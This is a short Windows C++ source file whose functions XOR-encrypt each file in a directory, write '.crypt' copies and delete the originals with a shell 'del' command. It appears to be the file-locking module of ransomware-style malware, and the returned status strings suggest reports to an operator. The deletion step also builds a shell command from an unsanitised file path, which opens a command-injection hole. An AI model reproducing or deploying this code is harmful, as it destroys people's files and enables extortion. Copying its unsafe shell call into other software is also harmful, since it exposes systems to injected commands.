#include <string>
#include <fstream>
#include <vector>
#include <windows.h>

#include "Utils.h"


std::string readFile(const std::string fileName) {
	std::ifstream file(fileName);
	file.seekg(0, std::ios::end);
	std::streamoff size = file.tellg();
	std::string s(size, ' ');
	file.seekg(0);
	file.read(&s[0], size);
	return s;
}

std::string CryptFile(std::string path, int key) {
	try {
		std::string data = readFile(path), delcmd = "del " + path, cryptdata;
		for (unsigned int item = 0; item < data.length(); ++item)
			cryptdata += data[item] ^ key;

		std::ofstream crfile(path + ".crypt");
		for (unsigned int item = 0; item < cryptdata.length(); ++item)
			crfile << cryptdata[item];

		crfile.close();
		system(delcmd.c_str());
		return "crypt " + path + " ok";
	}
	catch (...) {
		return "crypt " + path + " failed";
	}
}

std::string CryptDir(std::string path, int key) {
	std::string buf;
	std::vector<std::string> v;
	v = scandir(path + "*");
	for (unsigned int i = 0; i < v.size(); i++) {
		try {
			CryptFile(path + v[i], key);
			buf += "crypt " + path + v[i] + " ok\n";
		}
		catch (...) {
			continue;
		}
	}
	return buf;
}